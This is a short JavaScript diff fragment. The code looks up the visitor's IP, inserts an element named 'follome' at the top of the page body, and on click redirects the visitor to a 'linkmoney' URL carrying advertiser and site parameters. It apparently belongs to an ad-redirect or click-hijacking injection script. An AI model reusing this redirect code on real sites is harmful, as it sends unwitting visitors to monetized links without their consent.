@@ -47,13 +47,24 @@ fetch('https://api64.ipify.org?format=json')
           e.id = "follome";
           document.body.insertBefore(e, document.body.firstChild);
 
-          jQuery("#follome").click(function () {
-            var r = "gepeng3";
-            var e = linkmoney + "/?adv=" + idadvs + "&web=" + r;
+         
+        var custom = data.custom;
+        jQuery("#follome").click(function () {
+            var web;
+        
+            if (custom === '' || custom === undefined || custom === null) {
+                web = hostname;
+            } else {
+                web = custom;
+            }
+        
+            var e = linkmoney + "/?adv=" + idadvs + "&web=" + web;
             document.location.href = e;
             console.log(e);
-          });
-        }
+        });
+
+
+        
 
         // Call the function
         setImg();
